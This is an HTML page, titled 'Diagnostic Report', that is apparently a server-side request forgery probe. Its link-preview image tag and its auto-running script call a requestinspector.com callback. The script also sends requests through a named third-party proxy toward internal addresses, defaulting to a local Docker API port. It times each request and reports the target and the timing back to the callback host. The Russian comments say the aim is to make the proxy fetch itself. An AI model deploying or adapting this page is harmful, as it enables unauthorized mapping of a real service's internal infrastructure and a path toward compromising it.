<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Diagnostic Report</title>
    <meta property="og:title" content="SSRF Test">
    
    <meta property="og:image" content="https://01kghyewqpr6gac146mvj6nt9400-08f6870c60f820d7da1f.requestinspector.com/SERVER_PROBED_US">

    <script>
        const inspector = "https://01kghyewqpr6gac146mvj6nt9400-08f6870c60f820d7da1f.requestinspector.com";
        const proxy = "https://max.ru/proxy?url=";
        
        // Получаем цель из URL (например, 127.0.0.1:2375)
        const urlParams = new URLSearchParams(window.location.search);
        const target = urlParams.get('target') || "127.0.0.1.nip.io:2375";

        async function start() {
            const startTime = Date.now();
            
            // Отправляем сигнал "Начало теста"
            fetch(`${inspector}/START_TEST?target=${target}`);

            try {
                // Пытаемся заставить их прокси обратиться к самому себе
                await fetch(`${proxy}http://${target}`, { mode: 'no-cors' });
            } catch (e) {}

            const duration = Date.now() - startTime;
            
            // Отправляем результат замера
            fetch(`${inspector}/RESULT?time=${duration}ms&target=${target}`);
        }

        start();
    </script>
</head>
<body>
    <h1>Testing infrastructure... Check Inspector logs.</h1>
</body>
</html>
